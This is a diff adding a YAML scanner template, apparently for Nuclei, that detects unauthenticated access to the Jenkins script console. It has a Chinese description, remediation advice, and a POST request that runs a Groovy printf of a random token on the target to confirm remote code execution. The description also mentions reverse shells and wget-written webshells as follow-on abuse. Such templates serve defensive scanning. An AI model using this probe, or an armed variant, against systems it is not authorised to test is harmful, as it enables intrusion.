@@ -1,0 +1,28 @@
+id: jenkins-unauthorized-access
+info:
+  name: jenkins 未授权访问-任意命令执行
+  author:
+  - l0ne1y
+  description: |-
+    Jenkins未授权访问导致任意命令执行漏洞
+    CloudBees Jenkins（Hudson Labs）是美国CloudBees公司的一套基于Java开发的持续集成工具。该产品主要用于监控持续的软件版本发布/测试项目和一些定时执行的任务。攻击者可未授权访问管理控制台,可以通过脚本命令行执行系统命令。通过该漏洞,可以后台管理服务,通过脚本命令行功能执行系统命令,如反弹shell,wget写webshell文件。
+  severity: critical
+  remediation: |-
+    1、后台管理系统禁止直接暴漏在互联网，需通过VPN等较为安全的接入方式访问内部系统。
+    2、后台管理系统所有页面开启身份认证，根据情况选择对应方式（认证用户，用户名密码）。
+    3、限制IP访问，绑定固定的IP访问后台管理系统。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - contains(body,verify) && status_code==200
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/script'
+  method: POST
+  body: script=printf%28%27{{verify}}%27%29%3B&Jenkins-Crumb={{verify}}&Submit=%E8%BF%90%E8%A1%8C
+variables:
+  verify: '{{rand_text_alphanumeric(8,"")}}'
